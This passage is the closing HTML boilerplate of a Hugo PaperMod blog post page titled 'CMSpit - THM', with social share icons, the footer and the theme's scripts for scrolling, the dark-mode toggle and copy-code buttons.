        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share CMSpit - THM on telegram"
        href="https://telegram.me/share/url?text=CMSpit%20-%20THM&amp;url=https%3a%2f%2fsh3bu.github.io%2fthemes%2fhugo-PaperMod%2fposts%2fcmspit%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://sh3bu.github.io/themes/hugo-PaperMod">Shebu 🔽</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
